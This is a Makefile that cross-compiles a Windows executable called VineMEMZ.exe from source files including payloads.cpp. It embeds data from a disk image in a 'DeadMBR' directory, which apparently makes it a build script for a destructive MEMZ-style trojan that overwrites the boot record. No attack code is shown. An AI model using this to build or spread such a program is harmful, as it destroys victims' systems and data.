CC = i686-w64-mingw32-g++
PYTHON = python2

CCFLAGS = -mwindows -m32 -municode -fpermissive -Os -w -march=i486
LIBS    = -luser32 -lkernel32 -lgdi32 -lwinmm -lcomctl32 -ladvapi32 -lshell32 -lpsapi -nodefaultlibs -nostdlib

# Don't change the build directory, it may hardcoded on other places
BUILDDIR = Build

CFILES = $(shell find src -name '*.cpp' -type f)
HFILES = $(shell find src -name '*.h' -type f)

DATA = $(wildcard Data/*)


all: dir $(BUILDDIR)/VineMEMZ.exe

dir: $(BUILDDIR)

$(BUILDDIR):
	mkdir -p $(BUILDDIR)
	
$(BUILDDIR)/Data.cpp $(BUILDDIR)/Data.h: ../DeadMBR/disk.img $(DATA)
	$(PYTHON) Data/genData.py $(BUILDDIR)/Data.cpp $(BUILDDIR)/Data.h

$(BUILDDIR)/VineMEMZ.exe: $(CFILES) $(HFILES) $(BUILDDIR)/Data.cpp $(BUILDDIR)/Data.h
	$(CC) $(CCFLAGS) $(BUILDDIR)/Data.cpp src/main.cpp src/data.cpp src/payloads.cpp src/utils.cpp $(LIBS) -o $@
	
clean:
	rm -r $(BUILDDIR)

exe: dir $(BUILDDIR)/VineMEMZ.exe

.PHONY: clean all dir exe